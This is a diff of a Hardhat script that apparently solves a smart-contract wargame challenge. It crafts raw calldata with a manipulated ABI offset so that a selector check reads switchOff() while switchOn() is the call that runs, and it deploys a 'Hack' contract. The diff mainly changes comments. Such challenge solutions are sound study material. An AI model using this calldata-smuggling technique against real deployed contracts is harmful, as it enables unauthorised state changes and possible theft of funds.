@@ -7,7 +7,10 @@
 const hre = require("hardhat");
 require("dotenv").config();
 async function main() {
-  //You can use simple Wallet to do this challenge or use contract and send calldata via a function
+
+  //!You can use simple Wallet to do this challenge or use contract and send calldata via a function
+  //? Both approach implemented below...
+
 /* const goerli_account="0x49d214291B14373292A66c4dfa4d8E25A99f9a88"
   const wallet=new hre.ethers.Wallet(process.env.PRIVATE_KEY_SEPOLIA)
   const provider=hre.ethers.getDefaultProvider(process.env.ALCHEMY_SEPOLIA_URL)
@@ -22,22 +25,22 @@ const bytes=hre.ethers.utils.toUtf8Bytes("flipSwitch(bytes)")
 const fSwitch=hre.ethers.utils.keccak256(bytes).substring(0,10) */
 //const tx=  await connectedWallet.sendTransaction(transaction)
 
-              //flipSwitch function selectors keccak256 hashed value taken 4 byte 
+              //!flipSwitch function selectors keccak256 hashed value taken 4 byte 
 const callData="0x30c13ade"+
-              //offset value hardcoded-- this value tells us where the data value starts, decimal 96
+              //! offset value hardcoded-- this value tells us where the data value starts, decimal 96
 "0000000000000000000000000000000000000000000000000000000000000060"+
-              //extra 32 byte 
+              //!extra 32 byte 
 "0000000000000000000000000000000000000000000000000000000000000000"+
-              //function selector of switchOff()
+              //!function selector of switchOff()
 "20606e1500000000000000000000000000000000000000000000000000000000"+
-              //this part tells us the size of data we give as argument - 4 byte
+              //!this part tells us the size of data we give as argument - 4 byte
 "0000000000000000000000000000000000000000000000000000000000000004"+
-              //function selector of switchOn() -> This location is 96 and our offset value points to this position
+              //!function selector of switchOn() -> This location is 96 and our offset value points to this position
 "76227e1200000000000000000000000000000000000000000000000000000000"
 
 
 /*  console.log("Wallet address",wallet.address)
- //console.log("Tx response:",tx)
+ console.log("Tx response:",tx)
  console.log("Flipswitch encoded",fSwitch) */
 const Hack=await hre.ethers.getContractFactory("Hack")
 const hack=await Hack.deploy()
@@ -56,11 +59,10 @@ main().catch((error) => {
 });
 
 
-/* 
-  SlotCheck contract's slot 0x0:
-                        0x  00000              --> padding into 32 bytes
+ //TODO: SlotCheck contract's slot 0x0:
+                   /*      0x  00000              --> padding into 32 bytes
                             6f05b59d3b20000    --> struct.amount  
                             01                 --> struct.isApproved
                             0c                 --> struct.id
-                            92e5c70dd41824a0617e07271a7e1e81a9bce064 --> struct.receiver
-                            */
+                            92e5c70dd41824a0617e07271a7e1e81a9bce064 --> struct.receiver */
+                            
